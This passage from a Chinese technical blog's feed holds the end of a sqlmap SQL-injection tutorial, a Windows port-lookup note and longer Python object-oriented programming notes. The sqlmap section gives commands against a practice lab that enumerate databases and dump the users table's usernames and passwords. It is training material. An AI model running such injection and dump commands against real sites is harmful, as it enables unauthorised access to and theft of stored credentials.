--current-db</span><br></pre></td></tr></table></figure><h3 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 --dbs</span><br></pre></td></tr></table></figure><h3 id="获取数据库的表名"><a href="#获取数据库的表名" class="headerlink" title="获取数据库的表名"></a>获取数据库的表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 -D security --tables</span><br></pre></td></tr></table></figure><h3 id="获取数据表下的字段名"><a href="#获取数据表下的字段名" class="headerlink" title="获取数据表下的字段名"></a>获取数据表下的字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 -D security -T emails --columns</span><br></pre></td></tr></table></figure><h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u http://mingy.lab/Less-1/?id=1 -D security -T emails -C id,email_id --dump</span><br></pre></td></tr></table></figure><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r aa.txt</span><br><span class="line">aa.txt的内容从burp抓取post页面保存下来,aa.txt文件注意其目录位置</span><br><span class="line">其他于GET类似</span><br><span class="line">python.exe .\sqlmap.py -r F:\Haoran\Documents\Intrude\1.txt --dbs</span><br><span class="line">python.exe .\sqlmap.py -r F:\Haoran\Documents\Intrude\1.txt -D security --tables</span><br><span class="line">python.exe .\sqlmap.py -r F:\Haoran\Documents\Intrude\1.txt -D security -T <span class="built_in">users</span> --columns</span><br><span class="line">python.exe .\sqlmap.py -r F:\Haoran\Documents\Intrude\1.txt -D security -T <span class="built_in">users</span> -C <span class="built_in">id</span>,password,username --dump</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.jianshu.com/p/a46abd1e67aa">sqlmap使用方法 - 简书 (jianshu.com)</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows查看端口占用</title>
      <link href="/%E7%9F%A5%E8%AF%86/Windows/Windows%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Windows/Windows%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Windwos查看端口占用"><a href="#Windwos查看端口占用" class="headerlink" title="Windwos查看端口占用"></a>Windwos查看端口占用</h1><p>命令：</p><ol><li>进入cmd终端</li><li>输入命令：<code>netstat -aon|findstr &quot;49157&quot;</code>，回车。查看被占用端口对应的<code>PID</code>，记下最后一位数字，即<code>PID</code>,这里是2720。</li><li>继续输入<code>tasklist|findstr &quot;2720&quot;</code>，回车，查看是哪个进程或者程序占用了2720端口，结果是：<code>svchost.exe</code></li></ol><p>或者是我们打开任务管理器，切换到进程选项卡，在PID一列查看2720对应的进程是谁，如果看不到PID这一列，可以这样：</p><ol><li>在任务管理器，点击<code>查看---&gt;选择列</code>，将<code>PID</code>(进程标示符)前面的勾打上，点击确定。</li><li>这样我们就看到了PID这一列标识，看一下2720对应的进程是谁，如果没有，我们把下面的显示所有用户的进程前面的勾打上，就可以看到了，映像名称是<code>svchost.exe</code>，描述是，Windows的主进程,与上面命令查看的完全一致。</li></ol><p>结束该进程：在任务管理器中选中该进程点击”结束进程“按钮，或者是在cmd的命令窗口中输入：<code>taskkill /f /t /im Tencentdl.exe</code></p><hr><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8. 进阶面向对象</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/8.%20%E8%BF%9B%E9%98%B6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/8.%20%E8%BF%9B%E9%98%B6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>进阶面向对象</p><h1 id="封装、继承、多态的内容回顾"><a href="#封装、继承、多态的内容回顾" class="headerlink" title="封装、继承、多态的内容回顾"></a>封装、继承、多态的内容回顾</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="使用函数来开发，代码如下："><a href="#使用函数来开发，代码如下：" class="headerlink" title="使用函数来开发，代码如下："></a>使用函数来开发，代码如下：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建全局变量</span></span><br><span class="line">int_list = <span class="built_in">list</span>()</span><br><span class="line">int_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work_1</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work_2</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work_3</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">实际开发中，为了完成较为复杂的任务往往需要多个函数进行配合使用</span></span><br><span class="line"><span class="string">当一个函数中收到了数据，为了让其他函数能够直接使用，很多人想到了使用全局变量来实现数据传递的功能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">但是这种做法也有不好的地方：并发程序对同一个全局变量进行操作，产生资源竞争的问题</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="使用类来开发"><a href="#使用类来开发" class="headerlink" title="使用类来开发"></a>使用类来开发</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Work</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.int_list = <span class="built_in">list</span>()</span><br><span class="line">        self.int_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">work_1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">work_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">work_3</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">obj_1 = Work()</span><br><span class="line">obj_2 = Work()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">通过类创建一个模板，使用这个模板来创建相关的功能</span></span><br><span class="line"><span class="string">使用不同的变量接收这个类创建的模板的实体</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">每一个实体互不干扰，在内存中享有独立的空间</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="使用面向对象开发的好处"><a href="#使用面向对象开发的好处" class="headerlink" title="使用面向对象开发的好处"></a>使用面向对象开发的好处</h3><blockquote><ol><li>可以更加准确的使用特定方法操作特定的数据：在使用面向过程编程时，当需要对数据处理的过程中，需要<strong>考虑用哪个函数来进行操作</strong>，但是当用面向对象编程时，因为已经将数据存储到了这个独立的空间中，这个独立的空间（即对象）中通过一个特殊的变量（<code>__class__</code>）能够获取到类（模板），而且这个类中的方法是有一定数量的，与此类无关的将不会出现在本类中，因此需要对数据处理时，<strong>可以很快速的定位</strong>到需要的方法是谁 这样更方便。</li><li>数据隔离：全局变量是只能有1份的，多个函数需要多个备份时，往往需要利用其它的变量来进行储存；而通过封装 会将用来存储数据的这个变量 变为了对象中的一个“全局”变量，只要对象不一样那么这个变量就可以再有1份，所以这样更方便</li><li>代码划分更清晰</li></ol></blockquote><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="使用继承的特性进行功能开发，代码如下："><a href="#使用继承的特性进行功能开发，代码如下：" class="headerlink" title="使用继承的特性进行功能开发，代码如下："></a>使用继承的特性进行功能开发，代码如下：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个类，在这个类中有基础功能</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Camera</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">take_photo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;拍照功能&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在拍照...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Telephone</span>(<span class="title class_ inherited__">Camera</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在打电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">answer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;接电话&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在接电话...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phone = Telephone()</span><br><span class="line">phone.call()</span><br><span class="line">phone.answer()</span><br><span class="line">phone.take_photo()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">通过上述代码发现 子类只需要继承父类就可以得到父类中的方法，无需重复编写</span></span><br><span class="line"><span class="string">如果没有继承这种特性的话，那么只能在一个类中编写特别多的功能。在这种情况下无法很好的进行功能升级</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="继承特性的优点"><a href="#继承特性的优点" class="headerlink" title="继承特性的优点"></a>继承特性的优点</h3><blockquote><ol><li>代码重用：能够提升代码的<strong>重用率</strong>，即开发一个类，可以在多个子功能中直接使用</li><li>代码更规范：继承能够<strong>有效的进行代码的管理</strong>，当某个类有问题只要修改这个类就行，而其继承这个类的子类往往不需要就修改</li></ol></blockquote><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MiniOS</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;MiniOS 操作系统类 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.apps = []  <span class="comment"># 安装的应用程序名称列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%s 安装的软件列表为 %s&quot;</span> % (self.name, <span class="built_in">str</span>(self.apps))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">install_app</span>(<span class="params">self, app</span>):</span><br><span class="line">        <span class="comment"># 判断是否已经安装了软件</span></span><br><span class="line">        <span class="keyword">if</span> app.name <span class="keyword">in</span> self.apps:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;已经安装了 %s，无需再次安装&quot;</span> % app.name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            app.install()</span><br><span class="line">            self.apps.append(app.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, version, desc</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.version = version</span><br><span class="line">        self.desc = desc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%s 的当前版本是 %s - %s&quot;</span> % (self.name, self.version, self.desc)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">install</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;将 %s [%s] 的执行程序复制到程序目录...&quot;</span> % (self.name, self.version))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PyCharm</span>(<span class="title class_ inherited__">App</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chrome</span>(<span class="title class_ inherited__">App</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">install</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在解压缩安装程序...&quot;</span>)</span><br><span class="line">        <span class="built_in">super</span>().install()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux = MiniOS(<span class="string">&quot;Linux&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(linux)</span><br><span class="line"></span><br><span class="line">pycharm = PyCharm(<span class="string">&quot;PyCharm&quot;</span>, <span class="string">&quot;1.0&quot;</span>, <span class="string">&quot;python 开发的 IDE 环境&quot;</span>)</span><br><span class="line">chrome = Chrome(<span class="string">&quot;Chrome&quot;</span>, <span class="string">&quot;2.0&quot;</span>, <span class="string">&quot;谷歌浏览器&quot;</span>)</span><br><span class="line"></span><br><span class="line">linux.install_app(pycharm)</span><br><span class="line">linux.install_app(chrome)</span><br><span class="line">linux.install_app(chrome)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(linux)</span><br></pre></td></tr></table></figure><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><ul><li><p>面向过程开发，简单、开发前期快速，越往后越复杂，适合小工程</p></li><li><p>面向对象开发，复杂、开发前期较慢，越往后开发越方便，适合大工程</p><p>没有最好的开发模式，只有经过多多练习，见的多了，感受多了，自然也就能够在不同的任务、不同的工程，使用合适的方式进行开发</p></li></ul><h1 id="静态方法与类方法"><a href="#静态方法与类方法" class="headerlink" title="静态方法与类方法"></a>静态方法与类方法</h1><h2 id="类属性与实例属性"><a href="#类属性与实例属性" class="headerlink" title="类属性与实例属性"></a>类属性与实例属性</h2><p>它们在定义和使用中有所区别，而最本质的区别是内存中保存的位置不同，</p><ul><li>实例属性属于对象</li><li>类属性属于类</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Province</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    country = <span class="string">&#x27;中国&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="comment"># 实例属性</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个实例对象</span></span><br><span class="line">obj = Province(<span class="string">&#x27;湖南省&#x27;</span>)</span><br><span class="line"><span class="comment"># 直接访问实例属性</span></span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br><span class="line"><span class="comment"># 直接访问类属性</span></span><br><span class="line">Province.country</span><br></pre></td></tr></table></figure><p>由上述代码可以看出【实例属性需要通过对象来访问】【类属性通过类和对象访问】，在使用上可以看出实例属性和类属性的归属是不同的。同时】</p><p>类属性与实例属性在内存中的保存方式：</p><ul><li>类属性在内存中只保存一份</li><li>实例属性在每个对象中都要保存一份</li></ul><p>应用场景：</p><ul><li>通过类创建实例对象时，如果每个对象需要具有相同名字的属性，那么就使用类属性，用一份既可</li></ul><h2 id="实例方法、静态方法与类方法"><a href="#实例方法、静态方法与类方法" class="headerlink" title="实例方法、静态方法与类方法"></a>实例方法、静态方法与类方法</h2><p>方法包括：实例方法、静态方法和类方法，三种方法在内存中都归属于类，区别在于调用方式不同。</p><ul><li>实例方法：由对象调用；至少一个self参数；执行实例方法时，自动将调用该方法的对象赋值给self</li><li>类方法：由类调用； 至少一个cls参数；执行类方法时，自动将调用该方法的类赋值给cls</li><li>静态方法：由类调用；无默认参数；就是一个存在于类中的普通方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">old_func</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 定义实例方法，至少有一个self参数 &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># print(self.name)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;实例方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">class_func</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 定义类方法，至少有一个cls参数 &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;类方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">static_func</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 定义静态方法 ，无默认参数&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;静态方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = Foo(<span class="string">&quot;中国&quot;</span>)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">f.old_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用类方法</span></span><br><span class="line">Foo.class_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用静态方法</span></span><br><span class="line">Foo.static_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过实例对象调用静态方法与类方法</span></span><br><span class="line">f.class_func()</span><br><span class="line">f.static_func()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">不要在一个类中写同名方法！！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    实例方法是使用在有不同的实例属性的值的情况下使用</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    类方法在多个方法中共享一个变量的场景下使用</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    静态方法在当前不需要任何这个类的属性和方法的使用可以进行使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="方法对比"><a href="#方法对比" class="headerlink" title="方法对比"></a>方法对比</h2><ul><li>相同点：对于所有的方法而言，均属于类，所以 在内存中也只保存一份</li><li>不同点：方法调用者不同、调用方法时自动传入的参数不同。</li></ul><h1 id="多继承以及MRO顺序"><a href="#多继承以及MRO顺序" class="headerlink" title="多继承以及MRO顺序"></a>多继承以及MRO顺序</h1><h2 id="多继承中调用父类不同方式结果不同"><a href="#多继承中调用父类不同方式结果不同" class="headerlink" title="多继承中调用父类不同方式结果不同"></a>多继承中调用父类不同方式结果不同</h2><blockquote><p>下面介绍了两种调用父类的对象的方法，使用super容易出错，在多继承中容易出问题，不过可以太过mro查看继承关系。一般习惯指定特定的父类名称进行父类的调用。如下面第一个例子。super可以用，只要小心即可~~~</p><p>多继承的时候，最好使用父类名称，避免使用super~~~或者如果真要用，可以使用<code>__mro__</code>搞清楚调用顺序再来使用~</p></blockquote><h3 id="单独调用父类的方法"><a href="#单独调用父类的方法" class="headerlink" title="单独调用父类的方法"></a>单独调用父类的方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******多继承使用类名.__init__发生的状态******&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init开始被调用&#x27;</span>)</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init开始被调用&#x27;</span>)</span><br><span class="line">        self.age = age</span><br><span class="line">        Parent.__init__(self, name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son2的init开始被调用&#x27;</span>)</span><br><span class="line">        self.gender = gender</span><br><span class="line">        Parent.__init__(self, name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son2的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grandson</span>(Son1, Son2):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, gender</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init开始被调用&#x27;</span>)</span><br><span class="line">        Son1.__init__(self, name, age)  <span class="comment"># 单独调用父类的初始化方法</span></span><br><span class="line">        Son2.__init__(self, name, gender)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gs = Grandson(<span class="string">&#x27;grandson&#x27;</span>, <span class="number">12</span>, <span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;姓名：&#x27;</span>, gs.name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;年龄：&#x27;</span>, gs.age)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;性别：&#x27;</span>, gs.gender)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******多继承使用类名.__init__发生的状态******\n\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">******多继承使用类名.__init__发生的状态******</span><br><span class="line">Grandson的init开始被调用</span><br><span class="line">Son1的init开始被调用</span><br><span class="line">parent的init开始被调用</span><br><span class="line">parent的init结束被调用</span><br><span class="line">Son1的init结束被调用</span><br><span class="line">Son2的init开始被调用</span><br><span class="line">parent的init开始被调用</span><br><span class="line">parent的init结束被调用</span><br><span class="line">Son2的init结束被调用</span><br><span class="line">Grandson的init结束被调用</span><br><span class="line">姓名： grandson</span><br><span class="line">年龄： 12</span><br><span class="line">性别： 男</span><br><span class="line">******多继承使用类名.__init__发生的状态******</span><br></pre></td></tr></table></figure><h3 id="多继承中super调用被重写的父类方法"><a href="#多继承中super调用被重写的父类方法" class="headerlink" title="多继承中super调用被重写的父类方法"></a>多继承中<code>super</code>调用被重写的父类方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******多继承使用super().__init__发生的状态******&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, *args, **kwargs</span>):  <span class="comment"># 为避免多继承报错，使用不定长参数，接受参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init开始被调用&#x27;</span>)</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, *args, **kwargs</span>):  <span class="comment"># 为避免多继承报错，使用不定长参数，接受参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init开始被调用&#x27;</span>)</span><br><span class="line">        self.age = age</span><br><span class="line">        <span class="built_in">super</span>().__init__(name, *args, **kwargs)  <span class="comment"># 为避免多继承报错，使用不定长参数，接受参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender, *args, **kwargs</span>):  <span class="comment"># 为避免多继承报错，使用不定长参数，接受参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son2的init开始被调用&#x27;</span>)</span><br><span class="line">        self.gender = gender</span><br><span class="line">        <span class="built_in">super</span>().__init__(name, *args, **kwargs)  <span class="comment"># 为避免多继承报错，使用不定长参数，接受参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son2的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grandson</span>(Son1, Son2):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, gender</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init开始被调用&#x27;</span>)</span><br><span class="line">        <span class="comment"># 多继承时，相对于使用类名.__init__方法，要把每个父类全部写一遍</span></span><br><span class="line">        <span class="comment"># 而super只用一句话，执行了全部父类的方法，这也是为何多继承需要全部传参的一个原因</span></span><br><span class="line">        <span class="comment"># super(Grandson, self).__init__(name, age, gender)</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name, age, gender)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Grandson.__mro__)</span><br><span class="line"></span><br><span class="line">gs = Grandson(<span class="string">&#x27;grandson&#x27;</span>, <span class="number">12</span>, <span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;姓名：&#x27;</span>, gs.name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;年龄：&#x27;</span>, gs.age)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;性别：&#x27;</span>, gs.gender)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******多继承使用super().__init__发生的状态******\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果在一个项目中遇到了类似的项目代码</span></span><br><span class="line"><span class="string">    我怎么确定父类的调用顺序？</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    (&lt;class &#x27;__main__.Grandson&#x27;&gt;, &lt;class 